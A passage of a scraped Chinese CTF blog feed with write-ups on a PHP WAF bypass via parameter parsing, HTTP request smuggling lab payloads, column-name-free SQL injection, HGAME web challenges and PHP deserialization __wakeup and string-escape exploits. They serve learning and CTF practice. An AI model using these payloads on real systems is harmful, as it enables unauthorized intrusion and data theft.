php的变量规则：&#39;^[a-zA-Z_\\x80-\\xff][a-zA-Z0-9_\\x80-\\xff]*$&#39;。这里的\\80-\\xff是ASCII的扩展码，其中包括一些数学符号，音符等等，这里既然这些符号是符合php变量规则的，我们就不必测试这些扩展码了。 在php中parse_str()函数和 $_GET，$_POST 在 PHP 中填充变量相似，也使用了同样的机制，所以测试代码中使用这个函数来代替 123456789101112131415161718192021222324&lt;?php&#x2F;*parse_str会对指定的字符串进行解析并转化为有效的变量名，有些非法的变量名就会进行替换，比如替换成下划线，或者之间删去，这个程序测试哪些字符会被替换成空或者下划线*&#x2F;$test_list &#x3D; [&quot;&#123;&#125;test_val&quot;,&quot;test&#123;&#125;_val&quot;,&quot;test_val&#123;&#125;&quot;];foreach($test_list as $key&#x3D;&gt;$val)&#123; for($i&#x3D;0;$i&lt;127;$i++) &#123; $new_val &#x3D; str_replace(&quot;&#123;&#125;&quot;,chr($i),$val); parse_str($new_val,$output); if(isset($output[&#39;test_val&#39;])) &#123; echo $i.&quot;:&quot;.chr($i).&quot; &#x3D;&gt;&quot;.&quot;删除&quot;.&quot;\\n&quot;; &#125; if(isset($output[&#39;_test_val&#39;])||isset($output[&#39;test__val&#39;])||isset($output[&#39;test_val_&#39;])) &#123; echo $i.&quot;:&quot;.chr($i).&quot; &#x3D;&gt;&quot;.&quot;_\\n&quot;; &#125; &#125; echo &quot;\\n&quot;;&#125;?&gt; 结果是: 123456789101112131415161718192032: &#x3D;&gt;删除38:&amp; &#x3D;&gt;删除43:+ &#x3D;&gt;删除46:. &#x3D;&gt;_95:_ &#x3D;&gt;_32: &#x3D;&gt;_43:+ &#x3D;&gt;_46:. &#x3D;&gt;_91:[ &#x3D;&gt;_95:_ &#x3D;&gt;_0: &#x3D;&gt;删除32: &#x3D;&gt;_38:&amp; &#x3D;&gt;删除43:+ &#x3D;&gt;_46:. &#x3D;&gt;_61:&#x3D; &#x3D;&gt;删除91:[ &#x3D;&gt;_95:_ &#x3D;&gt;_ 也可以看出在变量中间，开头，结尾插入不符合规则的字符时，处理的方式也不一样 0x02题目很简单，waf也只是限制了变量不能为字符串，利用上面的解析漏洞，我们 传入的变量如果有一些特殊的符号就可以绕过这个waf,如果在之后的解析中，这个特殊符号被替换为空了，不就达到目的了 这里采用在传参的时候给参数前面加个空格%20 /calc.php?%20num=s成功传入 /calc.php?%20num=print_r(scandir(chr(47)))扫根目录，这里/被过滤，利用函数生成 发现flag文件，打开得到flag /calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php代码审计","slug":"CTF/php代码审计","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"php变量解析","slug":"php变量解析","permalink":"https://123-prog.github.io/tags/php%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/"}]},{"title":"Http请求走私（smuggling)学习记录","slug":"Http请求走私学习记录","date":"2021-02-12T09:29:20.000Z","updated":"2021-07-18T14:18:18.669Z","comments":true,"path":"2021/02/12/Http请求走私学习记录/","link":"","permalink":"https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"HTTP smuggling 请求夹带攻击（请求走私）学习记录网站处理从一个或多个用户接收的HTTP请求序列有一定的方式，利用请求夹带技术，我们可以去干扰网站处理请求","text":"HTTP smuggling 请求夹带攻击（请求走私）学习记录网站处理从一个或多个用户接收的HTTP请求序列有一定的方式，利用请求夹带技术，我们可以去干扰网站处理请求 如何产生如今常见的web应用程序的体系结构，用户发送请求到服务器端，需要先将请求发送到前端服务器，也叫反向代理（区别正向代理，反向代理会隐藏实际服务器端），有时还称负载平衡器， 前端服务器，将HTTP请求转发给后端真实服务器的时候，通常向同一个后端网络连续发送多个请求，这些请求可能来自不同的用户，这样做也是为了效率，如果一个请求需要等着另一个请求处理完成才可以发送，效率十分低下 接收的服务器会根据HTTP请求标头确定一个请求的结束和下一个请求的开始 攻击者可以在HTTP请求中经过构造，让自己添加的东西经过服务器解释成为下一个请求的开始，附加到下一个请求（可能来自他人），造成请求夹带攻击 如何构造HTTP规范提供了两种不同的方式来指定请求的结束位置 Content-Length标头 Transfer-Encoding标头 CL标头以字节为单位指定HTTP请求中消息的长度 123456POST &#x2F;search HTTP&#x2F;1.1Host: normal-website.comContent-Type: application&#x2F;x-www-form-urlencodedContent-Length:11q&#x3D;smuggling TE标头指定消息体用分块编码 12345678910POST &#x2F;search HTTP&#x2F;1.1Host: normal-website.comContent-Type: application&#x2F;x-www-form-urlencodedTransfer-Encoding: chunkedbq&#x3D;smuggling0 每个块以十六进制数开始，这个数表示块的大小，单位是字节，接着是块内容 消息体以块大小为0的块作为结束，0后面有两个换行符（/r/n/r/n) 当单个消息中同时使用这两种方法，如果前端服务器和后端服务器的处理标头的行为不同，就会导致请求夹带漏洞 如何执行HTTP请求夹带攻击请求夹带将会把CL头和TE头放进一个HTTP请求中，前端服务器和后端服务器会对这两个头进行取舍处理，如何完成我们的夹带攻击，需要看这两台服务器的具体处理方式 CL.TE：前端服务器使用Content-Length头，后端服务器使用Transfer-Encoding头。TE.CL：前端服务器使用Transfer-Encoding标头，后端服务器使用Content-Length标头。TE.TE：前端和后端服务器都支持Transfer-Encoding标头，但是可以通过以某种方式模糊标头来诱导其中一个服务器不处理它 CL.TE: 12345678POST &#x2F; HTTP&#x2F;1.1Host: vulnerable-website.comContent-Length: 13Transfer-Encoding: chunked0SMUGGLED 前端服务器处理CL头，确定消息体长度为13，直到SMUGGLED结束在前端服务器解释下都是一个请求，但在后端服务器解释，0是消息体结束的标志，后面的SMUGGLED将成为下一个请求的头部 TE.CL: 12345678POST &#x2F; HTTP&#x2F;1.1Host: vulnerable-website.comContent-Length: 3Transfer-Encoding: chunked8SMUGGLED0 要使用Burp Repeater发送此请求，需要关闭repeater的自动更新CL头的功能，还需要在最后的0之后包含尾随序列\\r\\n\\r\\n 前端服务器处理Transfer-Encoding标头，因此将消息体视为使用分块编码。它处理第一个块，长度为8个字节，直到SMUGGLED之后的行的开头。它处理第二个块，它被称为零长度，因此被视为终止请求。此请求将转发到后端服务器。 后端服务器处理Content-Length标头并确定请求主体长度为3个字节，直到8之后的行的开头。以SMUGGLED开头的以下字节未经处理，后端服务器将这些视为序列中下一个请求的开头。 TE.TE:混淆TE头 前端和后端服务器都支持Transfer-Encoding标头，但是可以通过以某种方式模糊标头来诱导其中一个服务器不处理它。 有很多混淆Transfer-Encoding标头的方法。例如： 123456789101112131415Transfer-Encoding: xchunkedTransfer-Encoding : chunkedTransfer-Encoding: chunkedTransfer-Encoding: xTransfer-Encoding:[tab]chunked[space]Transfer-Encoding: chunkedX: X[\\n]Transfer-Encoding: chunkedTransfer-Encoding: chunked 要发现TE.TE漏洞，有必要找到Transfer-Encoding标头的一些变体，以便只有一个前端或后端服务器处理它，而另一个服务器忽略它，转而使用CL，就跟前面两种处理方法利用方式一致了。 检测请求走私直接使用模糊测试，针对大流量的目标，极易受到干扰，攻击响应会被其他用户获得，从而无法得知漏洞是否存在 所以我们可以通过另一种方式，使用一系列的消息，消息让后端挂起并且让连接超时。 如，发送以下请求 123456789POST &#x2F;about HTTP&#x2F;1.1Host: example.comTransfer-Encoding: chunkedContent-Length: 41ZQ 对于CL.TE型： 前端服务器使用CL标头，4个字节长度只包含到Z结束，前端服务器就只会转发到Z为止的消息，后端使用TE头，检测不到消息体的结束（0长度的块），在等待下一个块的大小的时候超时，导致可以观察到的时间延迟 TE.TE：请求会被前端服务器直接拒绝 CL.CL: 请求会被两个服务器直接处理 TE.CL: 无效的块大小Q,前端服务器直接拒绝消息，不会转发至后端 再如：使用以下请求安全地检测： 12345678910POST &#x2F;about HTTP&#x2F;1.1Host: example.comTransfer-Encoding: chunkedContent-Length: 60X TE.CL: 前端检测到消息体结束标志，后面的X不会转发给后端服务器，但是后端服务器使用CL头，则会等待X到达，超时 CL.TE: 前端服务器夹带的X会感染后端套接字，可能会影响合法用户的访问请求，但用上一种方法，就可以排除这种影响 参考：https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn","categories":[{"name":"其他","slug":"其他","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"http smugglings","slug":"http-smugglings","permalink":"https://123-prog.github.io/tags/http-smugglings/"}]},{"title":"WebSecurityAcademy实验室-Http请求走私","slug":"Http请求走私-WebSecurityAcademy实验室","date":"2021-02-12T09:29:05.000Z","updated":"2021-07-18T14:16:16.728Z","comments":true,"path":"2021/02/12/Http请求走私-WebSecurityAcademy实验室/","link":"","permalink":"https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/","excerpt":"0x01 basic CL.TE vulnerability实验描述","text":"0x01 basic CL.TE vulnerability实验描述 需要完成的任务是让下一次请求报出GPOST方法错误，我们需要走私一个大写字母G，这样下一次请求就不是POST，而是GPOST 前端代理服务器使用Content-Length头，后端服务器使用Transfer-Encoding头，我们就可以在消息头构造出长度为0的消息块，这样前端服务器会将其当作是消息的一部分，而后端服务器会以为这里是消息体的结束位置，把后面的那些内容当作是下一次请求的开始 123456789POST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...Content-Length: 6Transfer-Encoding: chunked0G 这里0后面是两个换行（/r/n/r/n)，4个字节长度，用bp得记住把repeater的自动更新CL头的功能关闭 把上面的构造的请求发送给服务器，再请求一次就会发现提示错误请求GPOST。 两次请求差不多像这样： 123456789101112POST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...Content-Length: 6Transfer-Encoding: chunked0GPOST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...... 上一次请求的G直接附在了下一次请求的方法头部，让POST方法变成了GPOST 0x02 basic TE.CL vulnerability要求与第一个实验一样，只是这里反向代理和后端服务器所使用识别的头更改了，前端使用Transfer-Encoding标头，后端使用Content-Length标头 因为前端服务器使用TE头，所以我们的消息体中就必须包含一个长度为0的块闭合消息体，为了影响下一次请求，改变下一次请求方式，我们必须自己为下一次请求构造一个请求头 123456789101112131415POST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...Content-Length: 4Transfer-Encoding: chunked5cGPOST &#x2F; HTTP&#x2F;1.1Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 15x&#x3D;10 前端的代理服务器识别TE头，则会把消息体看成是两个消息块，第一个长度为5C,第二个为0，结束的标志 后端服务器使用CL头，由于长度只有4,所以除了5c和一个换行符，下面的所有消息会被当作是下一次请求的开始，这里我们直接构造好了请求头，把实际的第二次请求当作了消息体的一部分，两次请求如： 123456789101112131415161718POST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...Content-Length: 4Transfer-Encoding: chunked5cGPOST &#x2F; HTTP&#x2F;1.1Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 15x&#x3D;10POST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...... 第一次请求原本应该是到0那里结束，但我们构造了CL的大小，导致第一次请求到5c换行后就结束了，后面的都是第二次请求的内容，而第二次请求原本是在0后面开始 两次请求的结果 0x03 obfuscating the TE header实验要求： 混淆TE头，使得下一次请求的方法变更为GPOST 混淆TE头有很多种方法，可以多试几种 1Transfer-Encoding: xchunked 1Transfer-Encoding : chunked 12Transfer-Encoding: chunkedTransfer-Encoding: x 1Transfer-Encoding:[tab]chunked 1[space]Transfer-Encoding: chunked 1X: X[\\n]Transfer-Encoding: chunked 12Transfer-Encoding: chunked 经过尝试，第三种可行 混淆之后。对于头部 12Transfer-Encoding: chunkedTransfer-Encoding: x 前端服务器会认为这个就是传输编码的方式，是一个有效的头部，故前端会选择TE头去理解消息体，后端则认为这是一个有问题的头部，如果此时存在Content-Length标头，后端服务器就会选择Content-Length去理解消息体。这样就跟前面的TE.CL一样了 请求如下 12345678910111213141516POST &#x2F;HTTP&#x2F;1.1Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net...Content-Length: 4Transfer-Encoding: chunkedTransfer-Encoding: x5cGPOST &#x2F; HTTP&#x2F;1.1Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 15x&#x3D;10 连续两次请求得到“Unrecognized method GPOST”","categories":[{"name":"其他","slug":"其他","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"http smuggling","slug":"http-smuggling","permalink":"https://123-prog.github.io/tags/http-smuggling/"}]},{"title":"无列名注入","slug":"无列名注入","date":"2021-02-10T16:01:16.000Z","updated":"2021-09-22T10:04:33.004Z","comments":true,"path":"2021/02/11/无列名注入/","link":"","permalink":"https://123-prog.github.io/2021/02/11/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/","excerpt":"0x01information_schema数据库是注入常用的库，但如果被waf过滤的话，我们就需要寻找其他视图进行利用","text":"0x01information_schema数据库是注入常用的库，但如果被waf过滤的话，我们就需要寻找其他视图进行利用 比如mysql5.7新增的sys.schema_auto_increment_columns,sys数据库下的一个记录自增字段的信息的视图，记录了包括自增字段的表名，库名等等 我们通过这种方法可以查的也有缺陷，我们无法查到列名，除了自增的列名，其他列名无法通过这种方法查得，这时候要注入就要用到无列名注入 0x02假如有一个有3个字段的表t1，我们只知道其中自增的id字段，其他不知道，这时候可以利用子查询的方法，不用列名就查出表里面的信息，有个前提，就是需要知道表的字段数，当然，不知道也可以猜嘛 首先，我们利用联合查询先把表中数据查出 select 1,2,3 union select * from t1; 返回的数据如 123456789+----+----------+------------+| 1 | 2 | 3 |+----+----------+------------+| 1 | 2 | 3 || 1 | flag0 | ssss || 2 | flag1 | ssss || 3 | flag2 | sss || 4 | flag3 | sss |+----+----------+------------+ 然后查询其中的一列数据 select a.1 from (select 1,2,3 union select * from t1)a 123456789+------------+| 1 |+------------+| 1 || 1 || 2 || 3 || 4 |+------------+ 0x03可以用布尔法一个一个字符进行判断比较 这种方法也得先知道表的字段数 假如我们有一个flag表，一个id字段，另一个字段存放flag select * from flag limit 0,1;得到我们要查的表的数据的第一行 select 1,’a’;构造比较目标，第一个1是id字段的值，第二个就是我们要比较得出的目标 进行比较： 123456mysql&gt; select (select 1,&#39;a&#39;)&gt;(select * from flag limit 0,1)+---------------------------------------------------------+| (select 1,&#39;a&#39;)&gt;(select * from flag limit 0,1) |+---------------------------------------------------------+| 0 |+---------------------------------------------------------+ 可以写脚本进行比较，也可以无列名得到数据","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"sql注入","slug":"CTF/sql注入","permalink":"https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"}]},{"title":"HGAME week1 web部分","slug":"HGAME-week1-web部分","date":"2021-02-08T12:30:27.000Z","updated":"2021-09-22T10:04:08.653Z","comments":true,"path":"2021/02/08/HGAME-week1-web部分/","link":"","permalink":"https://123-prog.github.io/2021/02/08/HGAME-week1-web%E9%83%A8%E5%88%86/","excerpt":"Hitchhiking_in_the_Galaxy0x01 搭顺风车打开题目看见，你来晚了，地球已经被沃贡人摧毁了。原因是地球挡住了它们的超空间快速通道。点击搭顺风车跳转，发现有跳转网页但又跳回来了，用bp抓包，可以得到跳转页面信息","text":"Hitchhiking_in_the_Galaxy0x01 搭顺风车打开题目看见，你来晚了，地球已经被沃贡人摧毁了。原因是地球挡住了它们的超空间快速通道。点击搭顺风车跳转，发现有跳转网页但又跳回来了，用bp抓包，可以得到跳转页面信息 405表示请求方法不对，用几种常见的请求方法都试一遍，发现用POST方法可以成功 POST请求得到的页面提示用无限非概率引擎访问，其实就是修改User-Agent，修改为Infinite Improbability Drive 接着得到必须从Cardinal来，则修改Referer为对应url 最后就是要求在本地访问才能得到flag，直接修改X-Forwarded-For为127.0.0.1即可获得flag watermelon0x01合成大西瓜，2000分拿flag,试着玩了几次，发现拿到2000分真的难（真的有大佬直接玩到2000分拿到flag了吗？ 这道题应该是在js源码中找弹flag的函数,需要用到cocos(不太了解)的debug tool，找到相应的事件节点名称，最终找到一个函数gamwOverShowText 拿去控制台执行得到flag 智商检测鸡0x01分析js源码可以得到，这道题是通过jQuery的ajax异步网络请求api/下的各种功能，返回json数据，通过处理json数据与后端进行交互，这里是答对100道题可以拿到flag,对应几个api功能： /api/getStatus：得到已解决题目数量 1&#123;&quot;solving&quot;:0&#125; /api/getQuestion: 获取问题 1&#123;&quot;question&quot;:&quot;&lt;math&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mo&gt;\\u222b&lt;&#x2F;mo&gt;&lt;mrow&gt;&lt;mo&gt;-&lt;&#x2F;mo&gt;&lt;mn&gt;92&lt;&#x2F;mn&gt;&lt;&#x2F;mrow&gt;&lt;mrow&gt;&lt;mn&gt;31&lt;&#x2F;mn&gt;&lt;&#x2F;mrow&gt;&lt;&#x2F;msubsup&gt;&lt;mo&gt;(&lt;&#x2F;mo&gt;&lt;mn&gt;12&lt;&#x2F;mn&gt;&lt;mi&gt;x&lt;&#x2F;mi&gt;&lt;mo&gt;+&lt;&#x2F;mo&gt;&lt;mn&gt;17&lt;&#x2F;mn&gt;&lt;mo&gt;)&lt;&#x2F;mo&gt;&lt;mtext&gt;&lt;mi&gt;d&lt;&#x2F;mi&gt;&lt;&#x2F;mtext&gt;&lt;mi&gt;x&lt;&#x2F;mi&gt;&lt;mtd&#x2F;&gt;&lt;&#x2F;mrow&gt;&lt;&#x2F;math&gt;&quot;&#125; /api/getFlag：在符合条件下给出flag 1&#123;&quot;flag&quot;:&quot;\\u9898\\u90fd\\u505a\\u4e0d\\u5b8c\\u8fd8\\u60f3\\u8981Flag?\\u5927\\u5b66\\u751f\\u5c31\\u8fd9\\u5c31\\u8fd9\\u5c31\\u8fd9\\u5c31\\u8fd9\\uff1f&quot;&#125; /api/verify: 检验答案的正确与否 需要post一个answer值，以json数据形式post 所以现在我们就可以用脚本模拟答题的流程 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import requestsfrom sympy import*import jsonimport regetQuestionUrl = &quot;http://r4u.top:5000/api/getQuestion&quot;submitUrl = &quot;http://r4u.top:5000/api/verify&quot;getFlagUrl = &quot;http://r4u.top:5000/api/getFlag&quot;headers1 = &#123; &#x27;Cookie&#x27;:&#x27;session=eyJzb2x2aW5nIjowfQ.YBuC-Q.yCqMKTZjGbAT1E2g9qbuyW5RWF0&#x27;, &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36 Edg/88.0.705.56&#x27; &#125;headers2=&#123; &#x27;Content-Type&#x27;:&#x27;application/json;charset=UTF-8&#x27;, &#x27;Cookie&#x27;:&#x27;session=eyJzb2x2aW5nIjowfQ.YBuC-Q.yCqMKTZjGbAT1E2g9qbuyW5RWF0&#x27;, &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36 Edg/88.0.705.56&#x27;&#125;for i in range(100): r1 = requests.get(url=getQuestionUrl, headers=headers1) q = r1.json()[&#x27;question&#x27;] #获取积分问题 pre = re.compile(r&#x27;&gt;(\\d+|-)&lt;&#x27;) #正则匹配计算的值 valList = pre.findall(q) print(i) #print(valList) if valList[0]==&#x27;-&#x27;: a = -int(valList[1]) b = int(valList[2]) c = int(valList[3]) d = int(valList[4]) else: a = int(valList[0]) b = int(valList[1]) c = int(valList[2]) d = int(valList[3]) #print(a,b,c,d) x = symbols(&quot;x&quot;) f = c*x+d myAnswer = integrate(f,(x,a,b)) #print(myAnswer) data = &#123; &#x27;answer&#x27;:float(myAnswer) &#125; r2 = requests.post(url=submitUrl,headers=headers2,data=json.dumps(data)) #提交答案 #print(r2.headers) new_cookie = r2.headers[&#x27;Set-Cookie&#x27;] #获取下一个cookie值 headers1[&#x27;cookie&#x27;] = new_cookie headers2[&#x27;cookie&#x27;] = new_cookie print(r2.text)r3 = requests.get(url=getFlagUrl, headers=headers1)print(r3.text) 脚本里我直接用cookie,因为我发现响应头有一个Set-Cookie，其实题目用的session存答对题目数量 最后拿到flag （flag说得对x","categories":[{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/categories/wp/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/tags/wp/"}]},{"title":"极客大挑战 2019 Http","slug":"极客大挑战-2019-Http","date":"2021-02-08T12:06:49.000Z","updated":"2021-09-22T10:01:38.075Z","comments":true,"path":"2021/02/08/极客大挑战-2019-Http/","link":"","permalink":"https://123-prog.github.io/2021/02/08/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http/","excerpt":"0x01 源码发现Secret.php","text":"0x01 源码发现Secret.php 0x02 访问 在http请求头中构造Referer: https://www.Sycsecret.com 再次请求得到 它让我们用Syclover浏览，修改User-Agent头即可 构造User-Agent: Syclover 请求 构造X-Forwarded-For: 127.0.0.1","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"other","slug":"CTF/other","permalink":"https://123-prog.github.io/categories/CTF/other/"}],"tags":[{"name":"http请求头","slug":"http请求头","permalink":"https://123-prog.github.io/tags/http%E8%AF%B7%E6%B1%82%E5%A4%B4/"}]},{"title":"极客大挑战 2019 PHP","slug":"极客大挑战-2019-PHP","date":"2021-02-03T10:27:09.000Z","updated":"2021-09-22T10:01:08.666Z","comments":true,"path":"2021/02/03/极客大挑战-2019-PHP/","link":"","permalink":"https://123-prog.github.io/2021/02/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/","excerpt":"0x01 源码泄露根据提示，网站存在备份，不用扫描，这里备份文件为常见的www.zip，得到源码","text":"0x01 源码泄露根据提示，网站存在备份，不用扫描，这里备份文件为常见的www.zip，得到源码 class.php: 123456789101112131415161718192021222324252627282930313233343536&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; index.php: 12345&lt;?php include &#x27;class.php&#x27;; $select = $_GET[&#x27;select&#x27;]; $res=unserialize(@$select);?&gt; 0x02 构造payload反序列化漏洞，这里需要绕过__wakeup()方法，让username=admin,passwd=100 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125;$a = new Name(&#x27;admin&#x27;,&#x27;100&#x27;);echo serialize($a); 得到结果 1O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125; 注意在类中username和password变量是private修饰的，所以序列化字符串中，在变量前和类名前其实存在一个\\0（表示ASCII码为0）不可见字符,这个字符不可见，但算进长度，所以我们提交的时候就需要在前面添加这个字符，用python提交写成\\0,如： 1?select&#x3D;O:4:&quot;Name&quot;:2:&#123;s:14:&quot;\\0Name\\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\\0Name\\0password&quot;;i:100;&#125; 在这道题中用get提交将\\0换成%00即可 1?select&#x3D;O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 最后，绕过__wakeup()方法，只需要让序列化字符串表示的对象属性个数大于实际属性个数就可以绕过 最后的payload 1?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 将属性个数2改成3就可以了","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php代码审计","slug":"CTF/php代码审计","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://123-prog.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"安洵杯 2019 easy_serialize_php","slug":"安洵杯-2019-easy-serialize-php","date":"2021-01-24T03:31:42.000Z","updated":"2021-09-22T10:00:38.812Z","comments":true,"path":"2021/01/24/安洵杯-2019-easy-serialize-php/","link":"","permalink":"https://123-prog.github.io/2021/01/24/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/","excerpt":"0x01 关于反序列化漏洞中的字符逃逸有两种，一种是经过字符串替换导致序列化的字符串变长，还有一种是经过字符串替代后序列化字符串变短，两种都是因为在序列化后，对序列化的字符串进行了过滤，对其中的敏感字符进行替代，原本是对用户的输入进行过滤，现在反倒出现了可以利用的机会","text":"0x01 关于反序列化漏洞中的字符逃逸有两种，一种是经过字符串替换导致序列化的字符串变长，还有一种是经过字符串替代后序列化字符串变短，两种都是因为在序列化后，对序列化的字符串进行了过滤，对其中的敏感字符进行替代，原本是对用户的输入进行过滤，现在反倒出现了可以利用的机会 1.字符串膨胀导致的字符逃逸测试程序： 123456789101112131415161718&lt;?phpfunction filter($str)&#123; return preg_replace(&#x27;/x/&#x27;, &#x27;xx&#x27;, $str);&#125;$username = $_GET[&#x27;name&#x27;];$password = &#x27;123456&#x27;;$user_info = array(&#x27;name&#x27;=&gt; $username, &#x27;pwd&#x27;=&gt;$password);$serialize_info = serialize($user_info);$serialize_info = filter($serialize_info);echo $serialize_info;echo &#x27;&lt;br&gt;&#x27;;$user = unserialize($serialize_info);echo $user[&#x27;name&#x27;];echo &#x27;&lt;br&gt;&#x27;;echo $user[&#x27;pwd&#x27;];?&gt; 我在本地的测试环境是php5.4.45，题目是php7.0.33，好像有些低版本会对序列化字符串中的双引号进行转义，导致测试失败，但我在php5.4.45经过测试，可以利用 123456789101112131.正常情况下：http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;3.php?name&#x3D;mySh1ft输出：a:2:&#123;s:4:&quot;name&quot;;s:7:&quot;mySh1ft&quot;;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;&#125;mySh1ft1234562.当我输入的参数name中带有x,过滤后就会出现问题，下面是利用方式http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;3.php?name&#x3D;xxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;s:3:&quot;pwd&quot;;s:6:&quot;654321&quot;;&#125;输出：a:2：&#123;s:4:&quot;name&quot;;s:52:&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;s:3:&quot;pwd&quot;;s:6:&quot;654321&quot;;&#125;&quot;;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;&#125;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx654321 a:2：{s:4:”name”;s:52:”xxxxxxxxxxxxxxxxxxxxxxxxxx”;s:3:”pwd”;s:6:”654321”;}“;s:3:”pwd”;s:6:”123456”;} a:2：{s:4:”name”;s:52:”xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx“;s:3:”pwd”;s:6:”654321”;}”;s:3:”pwd”;s:6:”123456”;} 原本52个字符应该包括上面加粗部分，但现在x被替换成xx,原本26个x刚好凑成52个字符，导致后面的部分逃逸，我们就可以通过name变量控制pwd变量，将pwd从123456改成654321，unserialize()函数在遇到;}时就会停止反序列化，后面的不会生效。 2.字符串缩短导致的字符逃逸测试程序： 